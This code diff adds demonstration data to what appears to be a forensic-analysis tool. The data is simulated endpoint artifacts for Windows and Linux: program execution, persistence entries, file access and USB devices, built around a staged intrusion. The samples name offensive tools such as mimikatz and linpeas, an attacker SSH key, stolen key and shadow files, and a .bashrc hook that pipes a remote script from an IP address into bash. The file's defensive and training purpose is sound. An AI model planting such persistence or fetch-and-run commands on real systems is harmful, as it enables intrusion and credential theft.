@@ -239,6 +239,106 @@ function buildDemoCommands(rows) {
 }
 
 /* -------------------------------------------------------------------------- */
+/* ENDPOINT ARTIFACTS (per category, OS-aware)                                 */
+/* -------------------------------------------------------------------------- */
+
+/*
+ * Demo records mirror the browser/command intrusion story: a legit-looking
+ * baseline plus malicious rows (temp execution, LOLBins, offensive tools,
+ * suspicious persistence, USB exfiltration) that trip the artifact rules and
+ * fall outside business hours. Each generator returns rows shaped like the
+ * category's fields, with a Unix-ms `time`.
+ */
+
+function demoExecution(os) {
+  const win = [
+    [1, 9, 20, 'chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 214, 'Prefetch'],
+    [1, 10, 2, 'Code.exe', 'C:\\Users\\analyst\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe', 88, 'Amcache'],
+    [2, 2, 33, 'le.exe', 'C:\\Users\\analyst\\AppData\\Local\\Temp\\le.exe', 3, 'Prefetch'],
+    [2, 2, 41, 'mimikatz.exe', 'C:\\Windows\\Temp\\mimikatz.exe', 1, 'Amcache'],
+    [2, 2, 52, 'rundll32.exe', 'C:\\Windows\\System32\\rundll32.exe C:\\Users\\analyst\\Downloads\\evil.dll,Start', 2, 'ShimCache'],
+    [2, 3, 4, 'procdump.exe', 'C:\\Windows\\Temp\\procdump.exe', 1, 'Prefetch'],
+  ]
+  const nix = [
+    [1, 9, 15, 'bash', '/usr/bin/bash', 402, 'auditd'],
+    [1, 11, 5, 'python3', '/usr/bin/python3', 57, 'auditd'],
+    [2, 2, 21, 'enum.sh', '/tmp/enum.sh', 1, 'auditd'],
+    [2, 2, 34, 'le', '/tmp/le', 4, 'auditd'],
+    [2, 2, 55, 'linpeas.sh', '/dev/shm/linpeas.sh', 1, 'auditd'],
+    [2, 3, 8, 'rclone', '/home/analyst/.cache/rclone', 2, 'auditd'],
+  ]
+  const rows = os === 'windows' ? win : nix
+  return rows.map(([d, h, m, name, path, runCount, source]) => ({
+    id: generateId(),
+    time: daysAgoAt(d, h, m),
+    fields: { name, path, runCount: String(runCount), source },
+  }))
+}
+
+function demoPersistence(os) {
+  const win = [
+    [10, 8, 0, 'OneDrive', 'Run key', 'C:\\Users\\analyst\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background', 'HKCU\\...\\Run'],
+    [2, 2, 58, 'Updater', 'Run key', 'C:\\Users\\analyst\\AppData\\Roaming\\a.exe', 'HKCU\\...\\Run'],
+    [2, 3, 12, 'SystemHealth', 'Scheduled Task', 'C:\\Windows\\Temp\\le.exe', 'C:\\Windows\\System32\\Tasks\\SystemHealth'],
+    [2, 3, 15, 'WinDefendSvc', 'Service', 'C:\\Users\\analyst\\AppData\\Roaming\\svc.exe', 'SYSTEM\\...\\Services'],
+  ]
+  const nix = [
+    [12, 9, 0, 'docker', 'systemd unit', '/usr/bin/dockerd', '/etc/systemd/system/docker.service'],
+    [2, 3, 12, 'cron-update', 'cron', '*/10 * * * * /tmp/le', '/var/spool/cron/analyst'],
+    [2, 3, 14, 'ssh-key', 'authorized_keys', 'ssh-ed25519 AAAA...attacker', '~/.ssh/authorized_keys'],
+    [2, 3, 18, 'bashrc-hook', 'shell rc', 'curl -s http://185.220.101.4/b.sh | bash', '~/.bashrc'],
+  ]
+  const rows = os === 'windows' ? win : nix
+  return rows.map(([d, h, m, name, kind, command, location]) => ({
+    id: generateId(),
+    time: daysAgoAt(d, h, m),
+    fields: { name, kind, command, location },
+  }))
+}
+
+function demoFileAccess(os) {
+  const win = [
+    [1, 9, 30, 'incident-report.docx', 'C:\\Users\\analyst\\Documents\\incident-report.docx', 'LNK'],
+    [1, 14, 12, 'budget-2024.xlsx', '\\\\fileserver\\finance\\budget-2024.xlsx', 'JumpList'],
+    [2, 2, 50, 'passwords.kdbx', 'C:\\Users\\analyst\\Documents\\passwords.kdbx', 'RecentDocs'],
+    [2, 3, 2, 'loot.7z', 'E:\\loot.7z', 'LNK'],
+    [2, 3, 5, 'exfil', 'E:\\exfil\\', 'ShellBag'],
+  ]
+  const nix = [
+    [1, 9, 30, 'incident-report.odt', '/home/analyst/Documents/incident-report.odt', 'recently-used'],
+    [2, 2, 50, 'id_rsa', '/home/analyst/.ssh/id_rsa', 'recently-used'],
+    [2, 3, 2, 'loot.tar.gz', '/media/analyst/USB/loot.tar.gz', 'recently-used'],
+    [2, 3, 5, 'shadow.bak', '/tmp/shadow.bak', 'recently-used'],
+  ]
+  const rows = os === 'windows' ? win : nix
+  return rows.map(([d, h, m, name, target, kind]) => ({
+    id: generateId(),
+    time: daysAgoAt(d, h, m),
+    fields: { name, target, kind },
+  }))
+}
+
+function demoUsb() {
+  const rows = [
+    [40, 10, 0, 'Kingston DataTraveler 3.0', '408D5C0E1F2A', 'Kingston / DT101', 'First connected'],
+    [2, 2, 48, 'SanDisk Ultra USB 3.0', 'AA010203BEEF', 'SanDisk / Ultra', 'First connected'],
+    [2, 3, 6, 'SanDisk Ultra USB 3.0', 'AA010203BEEF', 'SanDisk / Ultra', 'Last connected'],
+  ]
+  return rows.map(([d, h, m, device, serial, vendor, connection]) => ({
+    id: generateId(),
+    time: daysAgoAt(d, h, m),
+    fields: { device, serial, vendor, connection },
+  }))
+}
+
+const DEMO_BY_CATEGORY = {
+  execution: demoExecution,
+  persistence: demoPersistence,
+  fileaccess: demoFileAccess,
+  usb: (os) => demoUsb(os),
+}
+
+/* -------------------------------------------------------------------------- */
 /* API                                                                         */
 /* -------------------------------------------------------------------------- */
 
@@ -267,4 +367,18 @@ export function getDemoBrowserData(browser) {
 export function getDemoShellData(shell) {
   const rows = shell?.format === 'psreadline' ? PS_COMMAND_ROWS : UNIX_COMMAND_ROWS
   return { commands: buildDemoCommands(rows) }
+}
+
+/**
+ * Demonstration records for an endpoint artifact category, tailored to the
+ * host OS (Windows paths vs. POSIX paths).
+ * @param {object} category category definition (from config/artifacts.js)
+ * @param {string} os host OS id ('windows' | 'macos' | 'linux')
+ * @returns {{ records: Array }}
+ */
+export function getDemoArtifactData(category, os = 'windows') {
+  const generator = DEMO_BY_CATEGORY[category?.id]
+  // macOS reuses the POSIX-flavored rows.
+  const osKey = os === 'windows' ? 'windows' : 'linux'
+  return { records: generator ? generator(osKey) : [] }
 }
